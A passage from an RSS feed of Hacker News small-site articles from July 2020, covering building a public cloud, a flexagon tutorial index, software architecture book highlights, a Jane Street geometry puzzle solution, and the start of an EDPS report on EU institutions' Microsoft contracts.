especially data storage and computing power, without direct active management by the user. </p></blockquote><p><strong><em>Service Models</em></strong>. Our definition is broad, therefore we have multiple service models to enumerate:</p><ul><li><strong><em>Infrastructure as A Service:</em></strong> We don't have control over the underlying
cloud infrastructure but has control over the operating system, storage and applications. Popularized by AWS, Azure and GCP.</li><li><strong><em>Platform as a Service:</em></strong> With this service model we have control only over the deployed application. Examples are Google App Engine and
Amazon Fargate.</li><li><strong><em>Software as a Service:</em></strong> We have the capability of using an application through diverse clients. The greatest example is Salesforce. </li><li><strong><em>Backend as a Service:</em></strong> Web app and mobile app developers are provided with a way to link their applications to cloud storage and cloud computing services with application programming interfaces (APIs) exposed to their applications and custom software development kits (SDKs). Firebase is a good example
of backend as a service for mobile applications.</li><li><strong><em>Serverless Computing:</em></strong> Fully managed code by the cloud provider. Popularized by AWS Lambda.</li></ul><p>From <a href="https://www.fugue.co/blog/2014-08-11-minimum_viable_cloud.html">Josh Stella's Minimum Viable Cloud article</a> there are
other characteristics that are important for a <strong><em>Minimum Viable Cloud</em></strong>: </p><ul><li><strong><em>Elasticity:</em></strong> A cloud should be able to serve quickly its customers demands.</li><li><strong><em>Fault Tolerance:</em></strong> Or having resources in multiple geographical locations so even if a catastrophe happens
applications would run.</li><li><strong><em>Operational Expenditure instead of Capital Expenditure:</em></strong> Pay as you go approach and not in advance.</li></ul><p>As of now it seems that only the companies that we've seen before are the ones who satisfy all the marks.</p><p><strong><em>The fundamental characteristics of the cloud model</em></strong> are:</p><ul><li>An API for requesting computing and data resources.</li><li>Lack of active user management.</li></ul><p>That's why there are so many service models for cloud computing. But we want to build a Cloud.
There are other conditions we need to follow:</p><ul><li>Elasticity.</li><li>Fault Tolerance.</li><li>OpEx instead of CapEx.</li></ul><a name="why-not"></a><h3>Why don't we build a Cloud?</h3><p>Finally, we're ready to answer the question <em>can we even build our own cloud?</em>.</p><p>Perhaps, there's a path we can follow in order to build our own Cloud.
I'll write about OpenStack, a popular Cloud operating system.
Next, I'll list companies that are doing their own cloud.</p><p><strong>Existing solutions.</strong> <a href="https://www.openstack.org/">OpenStack</a> is the most popular solution for the creation of public
and private cloud providers. Why don't we have public clouds everywhere? There are many <a href="https://www.openstack.org/foundation/companies/">companies</a>
using OpenStack but most of it <a href="https://www.openstack.org/analytics">usage</a> comes from Private Clouds.</p><p><span>
      <span></span>
  <img alt="alt text" title="OpenStack" src="https://serradas.org/static/1f2bffc2a5fef7d5961e4d38785c7498/766a7/openstack.png" srcset="https://serradas.org/static/1f2bffc2a5fef7d5961e4d38785c7498/5243c/openstack.png 240w,https://serradas.org/static/1f2bffc2a5fef7d5961e4d38785c7498/766a7/openstack.png 401w" sizes="(max-width: 401px) 100vw, 401px" loading="lazy">
    </span></p><p>Even if we were to use OpenStack we would need to have Fault Tolerance for our use case, which is something hard to satisfy
without having multiple data centers in different geographical regions.</p><p><strong>There are companies trying to make a cloud by themselves or which have done it in the past</strong>:</p><ul><li><a href="https://www.digitalocean.com/">DigitalOcean</a>: From the founders of a managed hosting business, ServerStack. DigitalOcean
targets developers and startups instead of enterprise clients. They raised a Seed Funding of US$3.2 million. </li><li><a href="https://render.com/">Render</a>: "The Easiest Cloud for all your Apps and Websites" from their website. They take advantage
of Kubernetes plus AWS in order to provide a platform for applications.</li></ul><p>It introduces 2 different paths. Either getting a lot of funding at the beginning
or using a public cloud to bootstrap your business. Reinventing the wheel tempt can tempt us.
But there is a lack of innovation and a clear business case for innovating in the cloud.</p><p>Building a public cloud is not an easy feat. There are many aspects that we need to accomplish in order to make the customer
happy. Nevertheless, there are companies who've already done it from scratch. For this we have 2 paths:</p><ul><li>Funding</li><li>Bootstrap it using another public cloud.</li></ul><p>Innovation will be one of the most important things in this area.</p><h3>Conclusion</h3><p>So there you go! The answer of this question is...</p><blockquote><p>perhaps</p></blockquote><p>There are many trends in the cloud market at this moment. Companies have a hybrid infrastructure, one
that depends on multiple clouds providers.</p><p>We've understood that apart from an API and lack of active user management from resources we also need
to have elasticity, fault tolerance, and OpEx instead of CapEx in order to have a Minimum Viable Cloud.</p><p>Finally, we were able to check the different paths we could to take in order to make a cloud.</p><p>Follow me on <a href="https://twitter.com/RubenSerradas/">Twitter</a> if you liked this article.</p><p>If you want to keep in touch, join my <a href="https://tinyletter.com/rubenserradas">newsletter</a>.</p></section></div>]]>
            </description>
            <link>https://serradas.org/can-we-even-make-a-cloud-by-ourselves</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731052</guid>
            <pubDate>Sat, 04 Jul 2020 08:48:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn to Create and Flex Flexagons]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 14 (<a href="https://news.ycombinator.com/item?id=23730865">thread link</a>) | @bhy
<br/>
July 4, 2020 | http://loki3.com/flex/explore/ | <a href="https://web.archive.org/web/*/http://loki3.com/flex/explore/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            <h2>Learn to create and flex flexagons</h2>
            
          </div>
          <hr>
          <div>
            <div><p><img src="http://loki3.com/flex/explore/static/pinch-flex.jpg"></p><canvas width="300" height="100"></canvas>
            </div>
          </div>
          <a href="http://loki3.com/flex/explore/pinch-flex.html"><p> Chapter 1: Flexagon Intro </p><p> Exploring the hidden sides of hexaflexagons </p></a>
          <ul>
            <li>Introduces the <em>hexaflexagon</em>, with
              <!-- -->6
              <!-- --> equilateral triangles per side, and the <em>pinch flex</em>, a way of folding a flexagon to
              reveal previously hidden sides</li>
            <li>Let’s you explore how to visit every side of a flexagon</li>
            <li>Describes <em>flex notation</em>, which can be used to precisely describe a sequence of flexes</li>
            <li>Introduces the <em>Tuckerman Traverse</em> <!-- -->as a technique for visiting every side of a flexagon
              using the pinch flex</li>
            <li>Provides both a flexagon simulation and the unfolded strip for all hexaflexagons with
              <!-- -->3
              <!-- -->,
              <!-- -->4
              <!-- -->,
              <!-- -->5
              <!-- -->,
              <!-- -->6
              <!-- -->,
              <!-- -->7
              <!-- -->, and
              <!-- -->8
              <!-- --> sides so you can make your own</li>
            <li>Shows flexagons made up of different shapes of triangles, like using angles of
              <!-- -->3
              <!-- -->0
              <!-- -->-
              <!-- -->6
              <!-- -->0
              <!-- -->-
              <!-- -->9
              <!-- -->0
              <!-- --> or
              <!-- -->5
              <!-- -->4
              <!-- -->-
              <!-- -->5
              <!-- -->4
              <!-- -->-
              <!-- -->7
              <!-- -->2
              <!-- -->, and different numbers of triangles per side, like
              <!-- -->4
              <!-- -->,
              <!-- -->8
              <!-- -->,
              <!-- -->1
              <!-- -->0
              <!-- -->, or
              <!-- -->1
              <!-- -->2</li>
          </ul>
          <hr>
          <div>
            <div>
              <div><p><img src="http://loki3.com/flex/explore/static/F/F1.jpg" width="320" height="240"></p>
              </div>
            </div>
          </div>
          <a href="http://loki3.com/flex/explore/flexing.html"><p> Chapter 2: Flexing Flexagons </p><p> A short tour of different ways to flex a flexagon </p></a>
          <ul>
            <li>Describes a naming convention for a wide variety of triangle flexagons, like <em>pentaflexagon</em>
              <!-- -->and <em>silver octaflexagon</em></li>
            <li>Defines a <em>minimal flexagon</em> <!-- -->as the simplest flexagon that supports a given flex</li>
            <li>Demonstrates a sampling of interesting flexes on triangle flexagons: the pyramid shuffle, flip flex,
              tuck flex, v-flex, and silver tetra flex</li>
            <li>Shows that once you generalize the types of flexes you use, the concept of “sides” of a flexagon is no
              longer sufficient for understanding all the states you can explore</li>
          </ul>
          <hr>
          
          <a href="http://loki3.com/flex/explore/generators.html"><p> Chapter 3: Generating Sequences </p><p> Creating flexagons with flex sequences </p></a>
          <ul>
            <li>Summarizes the <em>flex notation</em> <!-- -->that was previously introduced for describing sequences of
              flexes</li>
            <li>Defines a <em>generating sequence</em> <!-- -->as a sequence of flexes used to create the structure
              necessary for performing them on a given flexagon</li>
            <li>Shows how different flexes move you around a pinch flex diagram</li>
            <li>Gives you an interactive tool for typing in generating sequences to see what pinch flex diagram is
              generated</li>
            <li>Allows you to type in generating sequences consisting of any of the flexes introduced so far on a wide
              variety of triangle flexagons, giving you the unfolded strip that can be used to construct a working
              flexagon</li>
          </ul>
          <hr>
          <div>
            <div>
              <div><p><img src="http://loki3.com/flex/explore/static/P4-4-4/1.jpg" width="320" height="240"></p>
              </div>
            </div>
          </div>
          <a href="http://loki3.com/flex/explore/pinch-variations.html"><p> Chapter 4: Pinch Flex Variations </p><p> Relatives of the pinch flex on different flexagons </p></a>
          <ul>
            <li>Describes a class of flexes that are related to the standard pinch flex</li>
            <li>Shows the minimal flexagon for a variety of flexes (e.g. P
              <!-- -->3
              <!-- -->3
              <!-- -->4
              <!-- --> and P
              <!-- -->3
              <!-- -->3
              <!-- -->3
              <!-- -->3
              <!-- -->) on several flexagons (e.g. the enneaflexagon and decaflexagon)</li>
            <li>Demonstrates generating sequences using these flexes to create interesting flexagons</li>
          </ul>
          <hr>
          <div>
            <p><img src="http://loki3.com/flex/explore/static/slot-example.jpg"></p>
            </div>
            <a href="http://loki3.com/flex/explore/slot-flexes.html"><p> Chapter 5: Slot Flexes </p><p> Flexes that involve sliding leaves through slots </p></a>
            <ul>
              <li>Describes a class of flexes called <em>slot flexes</em></li>
              <li>Demonstrates the related flexes called the <em>slot half</em> <!-- -->and <em>slot pocket</em></li>
              <li>Shows four <em>slot tuck flex</em> <!-- -->variants</li>
              <li>Finishes with the <em>slot triple pocket flex</em> <!-- -->on a pentaflexagon</li>
            </ul>
            <hr>
            <div>
              <p><em>pre</em>:
                <code>[[[1,2],3], 4, 5, [6,7], 8, 9]</code><br><em>post</em>:
                <code>[2, 4, 5, [6,7], 8, [-1,[9,-3]]]</code></p>
            </div>
            <a href="http://loki3.com/flex/explore/new-flexes.html"><p> Chapter 6: New flexes </p><p> How to define flexes with pat notation </p></a>
            <ul>
              <li>Describes using <em>pat notation</em> <!-- -->for the internal structure of a flexagon</li>
              <li>Shows how to define what a flex does by using pat notation to enumerate a flexagon’s structure before
                and after a flex</li>
              <li>Demonstrates using a flex definition to predict where you can do a flex and to predict exactly how a
                flexagon will change if you do the flex</li>
              <li>Provides definitions of the flexes discussed so far for hexaflexagons</li>
              <li>Lists additional details you need to fully understand when a flex can be performed</li>
              <li>Walks through an example of how to define a new flex and how to add it to the flexagon simulator</li>
            </ul>
            <hr>
            <div>
              <div>
                <ul>
                  <li><code>I ~= (Sh&gt;&gt;T'&gt;^T&lt;&lt;^) 2</code></li>
                  <li><code>I ~= (Ltb&gt;P&gt;P&gt;) 12</code></li>
                  <li><code>P ~= T&gt;&gt;&gt;V&gt;&gt;&gt;</code> so
                    <code>T' ~= &gt;&gt;&gt;V&gt;&gt;&gt;^P^</code></li>
                </ul>
              </div>
            </div>
            <a href="http://loki3.com/flex/explore/flex-sequences.html"><p> Chapter 7: Flex Sequences </p><p> Cycles, traversals, primes, and equalities </p></a>
            <ul>
              <li>Tools for finding cycles, flex sequences that end where they begin</li>
              <li>Examples of traversals, cycles that visit every state of a flexagon</li>
              <li><em>Prime flexes</em> <!-- -->that can’t be replaced by other flexes</li>
              <li>Sequences of flexes that are equal or almost equal to each other</li>
            </ul>
            <hr>
            <a href="http://loki3.com/flex/explore/playground.html"><p> Appendix: Flexagon Playground </p><p> General tools for exploring flexagons </p></a>
            <ul>
              <li>Tools for creating new flexagons from generating sequences or scripts and exploring them using a
                variety of flexes</li>
              <li>Get the unfolded strip for any of your creations so you can try out the physical version</li>
              <li>An explorer that can find all the states accessible with a specified set of flexes from any flexagon
              </li>
            </ul>
            <hr>
            <a href="http://loki3.com/flex/explore/flex-compendium.html"><p> Appendix: Flex Compendium </p><p> Details about flexes on triangle flexagons </p></a>
            <ul>
              <li>Reference guide to a wide variety of flexes on triangle flexagons</li>
              <li>Shows sample slides and sample strips to fold on various triangle flexagons</li>
              <li>Shows flex definitions in pat notation, etc.</li>
            </ul>
            <hr>
            <a href="http://loki3.com/flex/explore/references.html"><p> Flexagon References </p><p> Sources for additional flexagon information </p></a>
            <ul>
              <li>Bibliography for papers and publications</li>
              <li>Additional references</li>
            </ul>
            <hr>
            <p>For additional information, see <a href="http://loki3.com/flex/">loki3.com</a>.</p>
          </div><div>
              <p>Copyright © 2018-2019 Scott Sherman</p>
            </div></div>]]>
            </description>
            <link>http://loki3.com/flex/explore/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23730865</guid>
            <pubDate>Sat, 04 Jul 2020 07:57:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Essential highlights from things every software architect should know]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23730812">thread link</a>) | @kislayverma
<br/>
July 4, 2020 | https://www.kislayverma.com/post/highlights-97-things-every-software-architect-should-know | <a href="https://web.archive.org/web/*/https://www.kislayverma.com/post/highlights-97-things-every-software-architect-should-know">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p id="viewer-aprp8"><em><u>"</u></em><a href="https://www.amazon.in/Things-Every-Software-Architect-Should-ebook/dp/B0026OR30S/ref=tmm_kin_swatch_0?_encoding=UTF8&amp;qid=&amp;sr=&amp;tag=kislayverma-21" target="_blank" rel="noopener"><em><u>97 things every software architect should know</u></em></a><em><u>"</u></em> is a collection of (very) short essays by some of the most effective software architects of our times, and contains practical as well as philosophical guidance for aspiring and practising software architects. Each essay is extremely focussed on a specific them. Most of them talk about concrete scenarios and how to deal with them. They are also independent and can be read one-by-one - there is no progression from one essay to the next.</p><p id="viewer-32bi0">As someone who has been this role for some time now, it really resonated with me that a lot of the advice is not technical but rather focussed around team work and enablement. These are the parts that are most difficult to internalize for architects because we are trained to think like developers and measure ourselves in terms of "code shipped". The role of an architect is more than, as the many voices on this book repeatedly tell us.</p><p id="viewer-271u8">The moment I started reading "97 things every software architect should know", I realized that a lot of highlighting was going to happen :). I have included here what I feel are the highlights from the book and cover most of the messages conveyed in it. They are put here is the order of appearance in the book, and like the book, they do not follow a thematic progression. Pulling out highlights like this deprives them of some of the context they are written under, but I feel that these are  essential nuggets and stand on their own. This is good place to start if you want a flavour of what you will find inside the book. </p><p id="viewer-3etgi">I strongly recommend this book for anyone interested in playing the role of a software architect.</p><div><li id="viewer-9j867"><p><span>Architects are expected to know the technologies and software platforms on which their organizations run as well as the businesses that they serve.</span></p></li><li id="viewer-2euth"><p>Always put the customer’s long-term needs ahead of your own short-term needs and you won’t go wrong.</p></li><li id="viewer-fut85"><p>"Essential Complexity" represents the difficulty inherent in any problem.</p></li><li id="viewer-3duil"><p>"Accidental Complexity" grows from the things we feel we must build to mitigate essential complexity.</p></li><li id="viewer-k32l"><p>In large-scale software, though, removing accidental complexity while retaining the solution to the essential complexity is challenging.</p></li><li id="viewer-jdfo"><p>Prefer frameworks derived from working code rather than ones cast down from ivory towers.</p></li><li id="viewer-58u6d"><p>Projects are built by people, and those people are the foundation for success and failure. </p></li><li id="viewer-686mn"><p>Being clear and concise in the way you communicate your ideas is vital to the success of any software project.</p></li><li id="viewer-54ehr"><p>Having the developer on your side creates a collaborative environment whereby decisions you make as an architect are validated. In turn, you get buy-in from developers by keeping them involved in the architecture process.</p></li><li id="viewer-91su3"><p>Experienced architects understand that they need to “sell” their ideas and need to communicate effectively in order to do that.</p></li><li id="viewer-8j4el"><p>A better expression than ‘common sense’ is contextual sense — a knowledge of what is reasonable within a given context.</p></li><li id="viewer-13bsc"><p>Sufficiently different nonfunctional properties of a subsystem create a boundary across which managing inconsistent representations is tractable.</p></li><li id="viewer-9e0oc"><p>To the extent that the business community fails to fulfill its responsibility to provide direction, answer questions, and make business decisions for the software development team, it is actually delegating the business decision making to software developers.The architect must provide the macro-context for this ongoing series of micro-decisions made by developers, by communicating and protecting the software architecture and business objectives, and must seek to ensure that developers do not make business decisions.</p></li><li id="viewer-4df1k"><p>The long-term interests of the software development team are best served when business drives.</p></li><li id="viewer-2ud6a"><p>The pursuit of speculative generality often leads to solutions that are not anchored in the reality of actual development. They are based on assumptions that later turn out to be wrong, offer choices that later turn out not to be useful, and accumulate baggage that becomes difficult or impossible to remove.</p></li><li id="viewer-fcvm3"><p>A good architect should be able to spot a problem, call the team together, and without picking out a victim, explain what the problem is or might be and provide an elegant workaround or solution.</p></li><li id="viewer-98k4t"><p><em>Build as a big bang event</em> in project development is dead.</p></li><li id="viewer-9tng6"><p>You’ll commonly see attempts to require overtime or sacrifice “less important scheduled tasks” (like unit testing) as a way to reduce delivery dates, or increase functionality while keeping the delivery dates as is.</p></li><li id="viewer-fd95d"><p>Every software architect should know and understand that you can’t have it all.</p></li><li id="viewer-ackvg"><p>Enough cannot be said about the importance of building a solid data model from Day One.</p></li><li id="viewer-j1dg"><p>While business rules and user interfaces do evolve rapidly, the structures and relationships within the data you collect often do not.</p></li><li id="viewer-dgc8e"><p>Migrating data from one schema to another in situ is difficult at best, time consuming always, and error prone often.</p></li><li id="viewer-aukbs"><p>The database is the final gatekeeper of your precious data. The application layer, which is by design ephemeral, cannot be its own watchdog.</p></li><li id="viewer-fm7mb"><p>The presence of two options is an indicator that you need to consider uncertainty in the design.</p></li><li id="viewer-dsh5b"><p>All architecture is design but not all design is architecture. Architecture represents the significant design decisions that shape a system, where significant is measured by cost of change.</p></li><li id="viewer-8589o"><p>Effective architecture is one that generally reduces the significance of design decisions.</p></li><li id="viewer-tbhr"><p>Issues that seemed trivial early in the project become critical after it is too late to fix them.</p></li><li id="viewer-8d4ti"><p>Individuals often face resistance when the rest of the team does not share their experience or knowledge.</p></li><li id="viewer-cr9rb"><p>Defensiveness is easy. Learning to stop it is hard. Pride in our accomplishments is easy. Recognizing our limitations without conscious effort is hard.</p></li><li id="viewer-4hu2o"><p>Did you give everyone’s ideas the respect and acknowledgment they deserved?</p></li><li id="viewer-afm13"><p>If it looks good, it probably is good.</p></li><li id="viewer-8rpjj"><p>The architect should constantly be on the lookout for decisions that will have to be made soon.</p></li><li id="viewer-3ncrl"><p>Effective software architects understand not only technology but also the business domain of a problem space. Without business domain knowledge, it is difficult to understand the business problem, goals, and requirements, and therefore difficult to design an effective architecture to meet the requirements of the business.</p></li><li id="viewer-7oifc"><p>Programming is an act of design, not an act of construction.</p></li><li id="viewer-b8rv4"><p>Over time, a good solution to the right challenge will probably outlast all others.</p></li><li id="viewer-1arns"><p>Was the solution an appropriate one for the problem? Did it solve the needs of the problem? Keep these as your measure — you will be a lot happier. Be happy with all that old stuff.</p></li><li id="viewer-frng"><p>Expanding scope is the enemy of success because the probability of failure grows faster than expected.</p></li><li id="viewer-bg1sm"><p>Question any requirements not explained in terms of measurable value to the customer. If it has no effect on the company’s bottom line, why is it a requirement?</p></li><li id="viewer-482pi"><p>Important requirements usually remain important as the business changes, while others change or even evaporate.</p></li><li id="viewer-dlq12"><p>Stewardship, taking responsibility and care of another’s property, is the appropriate role of an architect.</p></li><li id="viewer-6br1g"><p>Value stewardship over showmanship; never forget that you are playing with other people’s money.</p></li><li id="viewer-eq2j4"><p>It’s not ethical to worsen the lives of others, even a small bit, just to make things easy for yourself.</p></li><li id="viewer-ava0e"><p>We should plan to deploy one component at a time - it forces us to create well-defined interfaces between components.</p></li><li id="viewer-5b0n4"><p>When we deploy software, we are exposing ourselves to the accumulated technical risk embodied in the code. By deploying one component at a time, we spread technical risk out over a longer period of time.</p></li><li id="viewer-4f3uo"><p>It’s rare to find a technique that simultaneously provides higher commercial value and better architectural qualities, but early deployment of individual components offers both.</p></li><li id="viewer-32c4m"><p>Performance of the people building the system is often called productivity, and it is important because it directly affects the cost and schedule of the project.</p></li><li id="viewer-93i46"><p>To be an effective software architect you must understand the basic architecture and design patterns, recognize when those patterns are being used, know when to apply the patterns, and be able to communicate to other architects and developers using them.</p></li><li id="viewer-5nhuq"><p>Enterprise architecture patterns define the framework for the high-level architecture. Some of the more common architecture patterns include event-driven architecture (EDA), service-oriented architecture (SOA), resource-oriented architecture (ROA), and pipeline architecture.</p></li><li id="viewer-crdq0"><p>Application architecture patterns specify how applications or subsystems within the scope of a larger enterprise architecture should be designed.</p></li><li id="viewer-ciak9"><p>Integration patterns are important for designing and communicating concepts surrounding the sharing of information and functionality between components, applications, and subsystems.</p></li><li id="viewer-a682a"><p>Anti-patterns, a term coined by Andrew Koenig, are repeatable processes that produce ineffective results.</p></li><li id="viewer-211ab"><p>Context is king, and simplicity its humble servant.</p></li><li id="viewer-5172q"><p>While newsgroups rage with the flames of technology debates of X versus Y, it is idle amusement. The reason these debates rage is often not because of huge disparities in their technical merits, but rather because there are more subtle differences between them, and what features individuals value more than others when there is no guiding context to act as a trump card.</p></li><li id="viewer-6dg90"><p>In architecture as in all other operative arts, the end must direct the operation. The end is to build well. Well building has three conditions: Commodity, Firmness and Delight.</p></li><li id="viewer-9o4oi"><p>Duplication is evil. Repetitive work slows down development.</p></li><li id="viewer-c48q2"><p>It’s not the domain logic that is copied; it’s the infrastructure code that just has to be there to make it work.</p></li><li id="viewer-dm9rp"><p>It’s crucial that you can envision the effects your examples have.</p></li><li id="viewer-v7rt"><p>As an architect, you need to be highly sensitive to any kind of repetitive patterns, since anything you write will (ironically) be repeated.</p></li><li id="viewer-7ck7"><p>Repetition in code is something that developers eventually learn to filter out and …</p></li></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.kislayverma.com/post/highlights-97-things-every-software-architect-should-know">https://www.kislayverma.com/post/highlights-97-things-every-software-architect-should-know</a></em></p>]]>
            </description>
            <link>https://www.kislayverma.com/post/highlights-97-things-every-software-architect-should-know</link>
            <guid isPermaLink="false">hacker-news-small-sites-23730812</guid>
            <pubDate>Sat, 04 Jul 2020 07:43:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Excel Goal Seek and Wolfram Alpha; Jane Street Puzzle of June 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23730738">thread link</a>) | @bosveld
<br/>
July 4, 2020 | https://willemhoek.com/b/Solving-Jane-Street-Puzzle-June-2020 | <a href="https://web.archive.org/web/*/https://willemhoek.com/b/Solving-Jane-Street-Puzzle-June-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      
      
<p>Jul 04, 2020</p>

<p>
<img src="https://willemhoek.com/images/Van_Gogh_-_Starry_Night.jpg"><br>
Vincent van Gogh, The Starry Night, 1889</p>

<h3 id="circle-time">Circle Time</h3>

<p>Every month, Jane Street Capital post a puzzle on their website.  This was the puzzle for <a href="https://www.janestreet.com/puzzles/circle-time/">June 2020</a>.</p>

<blockquote>
  <p>Call a “ring” of circles a collection of six circles of equal radius, say r, whose centers lie on the six vertices of a regular hexagon with side length 2r. This makes each circle tangent to its two neighbors, and we can call the center of the regular hexagon the “center” of the ring of circles. If we are given a circle C, what is the maximum proportion of the area of that circle we can cover with rings of circles entirely contained within C that all are mutually disjoint and share the same center?</p>
</blockquote>

<h3 id="solution">Solution</h3>

<p>I think the most difficult step in this months puzzle was to translate the problem statement above into a visual representation, as shown below.  If you got this far, you probably were able to solve the puzzle.</p>

<p><img width="600" src="https://willemhoek.com/images/janestreet-202006_1a.png"></p>

<p>Due to the symmetry of a hexagon, the ratio of the radius of two adjacent ring of circles are always the same.  Basic trigonometry was required to determine this ratio.</p>

<p><img width="600" src="https://willemhoek.com/images/janestreet-202006_1b.png"></p>

<p><img src="https://willemhoek.com/images/janestreet-202006_sum.png"></p>

<p><img width="600" src="https://willemhoek.com/images/janestreet-202006_2.png"></p>

<p><img src="https://willemhoek.com/images/janestreet-202006_trig.png"></p>

<p>We now have a single equation, single variable.</p>

<h3 id="method-1-to-solve-the-equation-goal-seek-in-excel">Method 1 to solve the equation: Goal Seek in Excel</h3>

<p>I used the “Goal Seek” function in Excel to resolve <em>k</em>.</p>

<p>In Excel: select the <strong>Data</strong> tab, in the <strong>Data Tools</strong> group, click <strong>What-If Analysis</strong>, and then click <strong>Goal Seek</strong>.</p>

<p><img width="1500" src="https://willemhoek.com/images/janestreet-202006_excel.png"></p>

<p><img src="https://willemhoek.com/images/janestreet-202006_answer.png"></p>



<h3 id="method-2-to-solve-the-equation-online-solver-eg-wolframalpha">Method 2 to solve the equation: Online solver, e.g. WolframAlpha</h3>

<p>Another way to solve the equation is to use one of the online solvers, e.g. <a href="https://www.wolframalpha.com/input/?i=asin%28k%2F%281%2Bk%29%29+%2B+acos%281%2F%281%2Bk%29%29+%3D+pi%2F3">WolframAlpha</a></p>

<p>
<kbd><img img="" width="900" src="https://willemhoek.com/images/janestreet-202006_wolfram.png"></kbd>
</p>

<p><img src="https://willemhoek.com/images/janestreet-202006_answer.png"></p>

<p>This was the answer submitted that got my name on the “Correct Submissions” list.</p>

<p>As always, this was a lot of fun. Thanks to Jane Street for posting this.</p>

<h3 id="references-and-further-reading">References and further reading</h3>

<p>[1] GitHub:  Excel file (with Goal Seek) and Python code (to draw the diagrams)<br>
<a href="https://github.com/whoek/janestreet-puzzles/tree/master/2020-06">https://github.com/whoek/janestreet-puzzles/tree/master/2020-06</a>. Retrieved: 2020-07-04</p>

<p>[2] Jane Street - Puzzle Archive <br>
<a href="https://www.janestreet.com/puzzles/archive/">https://www.janestreet.com/puzzles/archive/</a>. Retrieved: 2020-07-04</p>







<!--End mc_embed_signup-->

<p><a href="https://github.com/whoek/whoek.github.io/edit/master/b/Solving-Jane-Street-Puzzle-June-2020.md">Edit</a></p>
      
    </div></div>]]>
            </description>
            <link>https://willemhoek.com/b/Solving-Jane-Street-Puzzle-June-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-23730738</guid>
            <pubDate>Sat, 04 Jul 2020 07:21:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Investigation into EU institutions’ use of Microsoft products and services]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23730721">thread link</a>) | @pkz
<br/>
July 4, 2020 | https://edps.europa.eu/sites/edp/files/publication/20-07-02_edps_euis_microsoft_contract_investigation_en.html | <a href="https://web.archive.org/web/*/https://edps.europa.eu/sites/edp/files/publication/20-07-02_edps_euis_microsoft_contract_investigation_en.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<header>
<h2>EDPS Public Paper on</h2>

<p>2 July 2020</p>
<div>
<p>The European Data Protection Supervisor (EDPS) is the independent supervisory authority established by Article 52 of <a href="https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=CELEX:32018R1725&amp;from=EN">Regulation (EU) 2018/1725</a> responsible for:</p>
<ul>
<li><p>Monitoring and ensuring the application of the provisions of Regulation (EU) 2018/1725 and any other EU act relating to the protection of the fundamental rights and freedoms of natural persons with regard to the processing of personal data by a EU institution or body;</p></li>
<li><p>Advising EU institutions and bodies and data subjects on all matters concerning the processing of personal data.</p></li>
</ul>
<p>To this end, the EDPS fulfils its duties in accordance with Article 57 of Regulation (EU) 2018/1725 and exercises the powers granted in Article 58 of Regulation (EU) 2018/1725.</p>
<p>The power to investigate is one of the tools established to monitor and ensure compliance with Regulation (EU) 2018/1725.</p>
</div>
<div>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. These findings and recommendations from the investigation are likely to be of wider interest than just of the EU institutions: they may be of particular interest to all public authorities in EU/EEA Member States.</p>
<p>The EDPS assessed the compliance of the licensing agreement between Microsoft and the EU institutions against the requirements laid down in Regulation (EU) 2018/1725<span data-cites="regulation20181725"><a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></span> which sets out the rules for data protection in the EU institutions, bodies, offices and agencies as well as the duties and powers of the European Data Protection Supervisor (EDPS).</p>
<p>In the interest of a coherent approach to personal data protection throughout the Union, and the free movement of personal data within the Union, the legislators aligned Regulation (EU) 2018/1725 as far as possible with the data protection rules of Regulation (EU) 2016/679<span data-cites="gdpr"><a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a></span> (‘General Data Protection Regulation’ - GDPR). Whenever the provisions of Regulation (EU 2018/1725 follow the same principles as the provisions of the GDPR, these two sets of provisions should, under the case law of the Court of Justice of the European Union be interpreted homogeneously, in particular because the scheme of this Regulation should be understood as equivalent to the scheme of the GDPR.</p>
<p>The EDPS made the following key findings in its investigation into the EU institutions’ use of Microsoft products and services.</p>
<p>First, the licensing agreement between Microsoft and the EU institutions allowed Microsoft to define and change the parameters of its processing activities carried out on behalf of EU institutions and contractual data protection obligations. The discretion that Microsoft had, amounted to a broad right for Microsoft to act as a controller. Given the EU institutions’ role as public service institutions, the EDPS did not consider this appropriate. The EDPS recommended to EU institutions that they act to retain controllership.</p>
<p>Second, EU institutions needed to put in place a comprehensive and compliant controller-processor agreement and documented instructions of the EU institutions to the processors. Their lack of control over which sub-processors Microsoft used and lack of meaningful audit rights also presented significant issues. The EDPS made recommendations on how to improve the controller-processor agreement and put robust audit checks in place.</p>
<p>Third, EU institutions faced a number of linked issues concerning data location, international transfers and the risk of unlawful disclosure of data. They were unable to control the location of a large portion of the data processed by Microsoft. Nor did they properly control what was transferred out of the EU/EEA and how. There was also a lack of proper safeguards to protect data that left the EU/EEA. EU institutions also had few guarantees at their disposal to defend their privileges and immunities and ensure that Microsoft would only disclose personal data insofar as permitted by EU law. The EDPS made recommendations to assist EU institutions in addressing these issues.</p>
<p>Fourth, the EDPS considered the technical measures that the Commission had put in place to stem the flow of personal data generated by Microsoft products and services and sent to Microsoft. The EDPS recommended that all EU institutions perform tests using a revised and comprehensive approach, share among them the knowledge and technical solutions they developed to prevent unauthorised data flows to Microsoft and inform each other of any data protection issues they identify with the products or services.</p>
